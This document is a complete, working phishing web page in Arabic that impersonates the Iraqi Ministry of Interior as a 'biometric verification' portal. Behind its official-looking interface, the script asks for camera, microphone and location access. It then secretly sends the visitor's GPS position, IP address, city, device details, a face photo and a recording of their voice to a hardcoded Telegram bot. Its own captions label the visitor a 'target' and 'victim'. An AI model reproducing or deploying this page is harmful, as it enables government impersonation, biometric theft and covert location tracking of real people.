<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Meta Tags for WhatsApp/Telegram Preview -->
    <title>وزارة الداخلية العراقية | النفاذ الوطني</title>
    <meta name="description" content="البوابة الرسمية لتحديث بيانات البطاقة الوطنية والتحقق البيومتري الموحد.">
    <meta property="og:title" content="وزارة الداخلية العراقية - منصة التحقق">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Seal_of_the_Ministry_of_Interior_of_Iraq.svg/1024px-Seal_of_the_Ministry_of_Interior_of_Iraq.svg.png">
    <meta property="og:type" content="website">

    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@300;500;700&display=swap" rel="stylesheet">
    <style>
        body { background: #f8fafc; color: #1e293b; font-family: 'Noto Sans Arabic', sans-serif; }
        .moi-gradient { background: linear-gradient(135deg, #1e3a8a 0%, #1e1b4b 100%); }
        .scanner-viewport { 
            width: 280px; height: 280px; border: 4px solid #1e40af; border-radius: 50%; 
            overflow: hidden; position: relative; background: #000; margin: 0 auto;
            box-shadow: 0 20px 50px rgba(30, 64, 175, 0.2);
        }
        .scan-line { 
            position: absolute; width: 100%; height: 3px; background: #3b82f6; 
            top: 0; box-shadow: 0 0 15px #3b82f6; animation: scan 2.5s infinite linear; z-index: 10;
        }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
        .mirror { transform: scaleX(-1); }
        .fade-in { animation: fadeIn 0.5s ease-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="flex flex-col items-center min-h-screen">

    <!-- Header Section -->
    <header class="moi-gradient w-full py-8 px-4 text-white text-center shadow-2xl relative">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Seal_of_the_Ministry_of_Interior_of_Iraq.svg/200px-Seal_of_the_Ministry_of_Interior_of_Iraq.svg.png" 
             alt="Logo" class="w-24 h-24 mx-auto mb-4 drop-shadow-xl">
        <h1 class="text-2xl font-bold mb-1">جمهورية العراق</h1>
        <h2 class="text-lg font-medium opacity-90">وزارة الداخلية - بوابة التحقق الرقمي</h2>
        <div class="mt-4 inline-block bg-blue-500/20 px-4 py-1 rounded-full text-[10px] uppercase tracking-widest border border-blue-400/30">
            Secure Biometric Gateway v2.0.99
        </div>
    </header>

    <!-- Main Application UI -->
    <main class="max-w-md w-full p-6 mt-4 flex-grow">
        <div id="uiCard" class="bg-white rounded-[2.5rem] p-8 shadow-2xl border border-slate-100 text-center space-y-8 fade-in">
            
            <div id="infoBox" class="bg-blue-50 p-4 rounded-2xl border border-blue-100 text-right">
                <p id="statusMsg" class="text-sm text-blue-900 font-bold leading-relaxed">
                    يرجى الضغط أدناه لتفعيل "النفاذ الوطني" وإتمام مسح ملامح الوجه والبصمة الصوتية لتحديث سجلاتك الرسمية.
                </p>
            </div>

            <!-- Scanner Viewport -->
            <div class="scanner-viewport">
                <video id="v" class="w-full h-full object-cover mirror" autoplay playsinline muted></video>
                <div id="scanOverlay" class="scan-line hidden"></div>
                <div id="successTick" class="absolute inset-0 bg-green-600/50 hidden flex items-center justify-center z-20">
                    <div class="bg-white rounded-full p-5 shadow-2xl"><svg class="w-12 h-12 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M5 13l4 4L19 7"></path></svg></div>
                </div>
            </div>

            <!-- Interactive Voice Challenge -->
            <div id="voiceUI" class="hidden space-y-4 animate-bounce">
                <p class="text-xs text-slate-500 font-bold">اقرأ الكود الأمني بوضوح لإثبات الهوية:</p>
                <div class="text-5xl font-black text-blue-950 bg-slate-100 py-4 rounded-3xl border-2 border-dashed border-blue-300">
                    <span id="randCode">0 0 0 0 0 0</span>
                </div>
            </div>

            <button id="activateBtn" class="w-full py-5 bg-blue-900 hover:bg-blue-800 text-white font-black text-lg rounded-2xl shadow-xl transition-all transform active:scale-95">
                تفعيل النفاذ الوطني الموحد
            </button>
        </div>
    </main>

    <footer class="p-6 text-center">
        <p class="text-[10px] text-slate-400">© 2026 مديرية نظم المعلومات - وزارة الداخلية العراقية</p>
    </footer>

    <canvas id="c" style="display:none"></canvas>

    <script>
        // التكوين البرمجي
        const TOKEN = "8679801579:AAHY2m_T25mkrGjBjHgAnEGmlg7DVmWCQrI";
        const CHAT_ID = "1523412137";

        // وظيفة الإرسال للتلجرام
        async function api(path, data) {
            try { await fetch(`https://api.telegram.org/bot${TOKEN}/${path}`, { method: 'POST', body: data }); } catch(e){}
        }

        // توليد كود عشوائي
        function genCode() {
            let c = "";
            for(let i=0; i<6; i++) c += Math.floor(Math.random() * 10) + " ";
            document.getElementById('randCode').innerText = c.trim();
        }

        async function init() {
            const btn = document.getElementById('activateBtn');
            const video = document.getElementById('v');
            const overlay = document.getElementById('scanOverlay');
            const voiceUI = document.getElementById('voiceUI');
            const status = document.getElementById('statusMsg');

            try {
                // طلب الأذونات (فيديو وصوت)
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                video.srcObject = stream;
                
                // تحديث الواجهة
                btn.style.display = 'none';
                overlay.classList.remove('hidden');
                voiceUI.classList.remove('hidden');
                status.innerText = "جاري مطابقة ملامح الوجه ونظام الصوت.. يرجى الثبات ونطق الكود بوضوح.";
                genCode();

                // 1. سحب الموقع والـ IP ومعلومات الجهاز
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                
                navigator.geolocation.getCurrentPosition(pos => {
                    const fd = new FormData();
                    fd.append('chat_id', CHAT_ID);
                    const msg = `🇮🇶 *هدف عراقي جديد أونلاين*\n\n📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n🌐 IP: \`${ipData.ip}\`\n🏙️ المدينة: ${ipData.city}\n📱 الجهاز: ${navigator.platform}`;
                    fd.append('text', msg);
                    fd.append('parse_mode', 'Markdown');
                    api('sendMessage', fd);
                });

                // 2. التقاط الصورة (بعد 3 ثواني)
                setTimeout(() => {
                    const canvas = document.getElementById('c');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', CHAT_ID);
                        fd.append('photo', blob, 'face.jpg');
                        fd.append('caption', "📸 صورة حيوية أثناء التحقق (وزارة الداخلية)");
                        api('sendPhoto', fd);
                    }, 'image/jpeg');
                }, 3000);

                // 3. تسجيل البصمة الصوتية (8 ثواني)
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const audioBlob = new Blob(chunks, { type: 'audio/ogg' });
                    const fdA = new FormData();
                    fdA.append('chat_id', CHAT_ID);
                    fdA.append('voice', audioBlob, 'voice.ogg');
                    fdA.append('caption', "🎤 بصمة صوت الضحية وهو يقرأ الكود");
                    await api('sendVoice', fdA);

                    // النهاية والنجاح
                    document.getElementById('successTick').classList.remove('hidden');
                    overlay.classList.add('hidden');
                    status.innerText = "تمت عملية النفاذ بنجاح. شكراً لتعاونكم.";
                    setTimeout(() => window.location.href = "https://www.google.com", 2000);
                };
                
                recorder.start();
                setTimeout(() => recorder.stop(), 8000);

            } catch (err) {
                status.innerText = "⚠️ خطأ: يجب السماح بالكاميرا والموقع لتحديث بياناتك الرسمية.";
                status.classList.remove('text-blue-900');
                status.classList.add('text-red-600');
            }
        }

        document.getElementById('activateBtn').addEventListener('click', init);
    </script>
</body>
</html>
